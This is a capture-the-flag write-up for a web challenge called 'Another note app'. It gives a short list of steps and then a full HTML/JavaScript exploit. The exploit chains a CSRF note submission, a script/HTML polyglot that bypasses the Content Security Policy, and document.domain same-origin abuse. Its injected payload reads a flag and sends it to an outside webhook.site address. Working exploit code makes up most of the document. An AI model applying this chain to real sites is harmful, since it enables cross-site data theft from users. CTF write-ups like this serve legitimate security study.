# Another note app
- Number of solves: 0
 
1. CSRF to add note
2. Bypass CSP on notes website with putting script and html file in a same file.
```js
alert();
`
<script src="/self">
</script>
`
```
3. Make main website same-origin with note website with giving `document.domain=document.domain` as feature
4. Use main domain's fetch to grep the flag.
Exploit:
```js
<html>
	<head>
	</head>
	<body>
		<script>
			window.target = {domain : "139.162.238.54", main : "http://139.162.238.54:9090",webhook:"https://webhook.site/-b79b-8005f993da3a"};
			var status = window.name;
			var t = 8;
			
			function getIncludeScriptPayload(){
				let payload = document.createElement("iframe");
				payload.srcdoc =  `<script src=${target.main}/note><\/script>`;
				return payload.outerHTML;
			}

			if(status == "csrf_note_include_script"){
				var form = document.createElement("form");
				form.id = "csrfForm";
				form.method = "POST";
				form.action = target.main+"/note";
				var inp = document.createElement("input");
				var jspayload = `
					document.domain="${target.domain}";
					setTimeout(()=>{
						parent.parent.opener.fetch("/flag",{method:"POST",headers:{"x-i-want":"flag"}}).then(r=>r.text()).then(r=>{
							parent.parent.location="${target.webhook}?flag="+r;
						});
					},1000);
				`.replace(/\n/g,"",/ /g,"");
				inp.value = jspayload+";`"+getIncludeScriptPayload()+"`";
				inp.name = "note";
				form.appendChild(inp);
				document.body.appendChild(form);
				csrfForm.submit();
			}


			if(status == "start_attack"){
				window.open("?","csrf_note_include_script");
				document.location = `${target.main}?feature=document.domain=document.domain`
			}

			function startattack(){
				window.open("?","start_attack");
			}

			if(status == "" || !isNaN(status)){
				startattack();
			}
		</script>
		<button onclick="startattack()">Attack</button>
	</body>
</html>
```
